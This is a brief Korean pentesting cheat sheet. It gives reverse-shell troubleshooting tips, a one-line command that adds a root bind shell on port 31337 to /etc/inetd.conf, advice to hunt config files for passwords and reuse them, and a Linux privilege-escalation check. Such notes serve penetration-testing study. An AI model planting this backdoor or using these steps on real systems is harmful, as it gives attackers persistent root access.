# 리버스 셸 연결이 안될 때
- nc/bash/python3 등 리버스 연결이 되지 않는다면 elf 파일 혹은 exe 파일을 만들어서 전달해서 실행시켜보기.
- 리스닝 포트를 well knwon 포트(80,443 등)로 바꿔서 받아보기.

---
# inetd.conf(옛날 리눅스 환경)
`
echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"
`

- 31337번 포트로 바인드 셸 연결

---
- config 파일을 먼저 find로 모두 찾아본 뒤에 패스워드 혹은 해시가 적혀 있는지 확인

- password reuse


# linux privilege escalation
```bash
id
# uid,gid,groups가 아닌 다른 id가 있으면 권한 상승이 되는지 확인
```
<img width="620" height="47" alt="image" src="https://github.com/user-attachments/assets/385e64d5-6119-4bde-9fb4-f6c631746f3b" />

- https://www.hackingarticles.in/disk-group-privilege-escalation
